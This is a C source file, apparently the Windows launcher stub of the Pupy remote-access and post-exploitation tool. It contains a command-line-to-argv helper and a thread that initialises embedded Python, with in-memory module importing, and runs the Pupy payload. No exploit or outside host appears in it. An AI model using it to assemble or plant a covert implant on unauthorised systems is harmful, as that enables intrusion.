/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>

#include "revision.h"
#include "pupy_load.h"
#include "debug.h"

#include "Python-dynload.c"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) init_pupy(void);

// https://stackoverflow.com/questions/291424/
LPSTR* CommandLineToArgvA(LPSTR lpCmdLine, INT *pNumArgs)
{
    LPWSTR lpWideCharStr;
    LPWSTR* args;
    LPSTR* result;
    LPSTR buffer;

    int retval;
    int numArgs;
    int storage;
    int bufLen;
    int i;

    retval = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, lpCmdLine, -1, NULL, 0);
    if (!SUCCEEDED(retval))
        return NULL;

    lpWideCharStr = (LPWSTR) malloc(retval * sizeof(WCHAR));
    if (lpWideCharStr == NULL)
        return NULL;

    retval = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, lpCmdLine, -1, lpWideCharStr, retval);
    if (!SUCCEEDED(retval))
    {
        free(lpWideCharStr);
        return NULL;
    }

    args = CommandLineToArgvW(lpWideCharStr, &numArgs);
    free(lpWideCharStr);
    if (args == NULL)
        return NULL;

    storage = numArgs * sizeof(LPSTR);
    for (i = 0; i < numArgs; ++ i)
    {
        BOOL lpUsedDefaultChar = FALSE;
        retval = WideCharToMultiByte(CP_ACP, 0, args[i], -1, NULL, 0, NULL, &lpUsedDefaultChar);
        if (!SUCCEEDED(retval))
        {
            LocalFree(args);
            return NULL;
        }

        storage += retval;
    }

    result = (LPSTR*)LocalAlloc(LMEM_FIXED, storage);
    if (result == NULL)
    {
        LocalFree(args);
        return NULL;
    }

    bufLen = storage - numArgs * sizeof(LPSTR);
    buffer = ((LPSTR)result) + numArgs * sizeof(LPSTR);
    for (i = 0; i < numArgs; ++ i)
    {
        BOOL lpUsedDefaultChar = FALSE;

        assert(bufLen > 0);

        retval = WideCharToMultiByte(CP_ACP, 0, args[i], -1, buffer, bufLen, NULL, &lpUsedDefaultChar);
        if (!SUCCEEDED(retval))
        {
            LocalFree(result);
            LocalFree(args);
            return NULL;
        }

        result[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    LocalFree(args);

    *pNumArgs = numArgs;
    return result;
}

DWORD WINAPI mainThread(LPVOID lpArg)
{
    LPSTR lpCmdLine = (LPSTR) lpArg;
    int argc = 0;
    char **argv = NULL;

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

    dprint("Initializing python...\n");
    if (!initialize_python()) {
        return -1;
    }

    dprint("Running pupy...\n");

    if (lpCmdLine)
        argv = CommandLineToArgvA(lpCmdLine, &argc);

    // no lpArg means shared object
    run_pupy(argc, argv, lpArg == NULL);

    dprint("Global Exit\n");

    return 0;
}
